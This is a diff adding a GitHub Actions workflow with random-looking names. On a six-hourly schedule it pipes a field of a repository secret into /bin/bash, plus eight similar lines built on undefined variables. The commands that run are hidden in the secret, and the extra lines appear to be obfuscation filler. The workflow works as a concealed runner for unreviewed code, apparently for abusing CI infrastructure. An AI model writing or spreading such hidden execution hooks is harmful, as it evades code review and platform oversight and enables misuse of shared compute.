@@ -1,0 +1,25 @@
+name: linzebei1938
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: linzebei1938
+        env:
+          i8965: ${{ secrets.i8965 }}
+        run: |
+          echo $i8965 | jq -r .txvz66421 | /bin/bash
+          echo $mjpm2 | jq -r .x31 | /bin/bash
+          echo $wm60 | jq -r .c25 | /bin/bash
+          echo $meocd41690 | jq -r .flxct195 | /bin/bash
+          echo $ujvlz54287 | jq -r .ddy36090 | /bin/bash
+          echo $au7 | jq -r .m7 | /bin/bash
+          echo $uwi2315 | jq -r .agl297 | /bin/bash
+          echo $v9513 | jq -r .mxap89845 | /bin/bash
+          echo $l69 | jq -r .mfls80 | /bin/bash
+
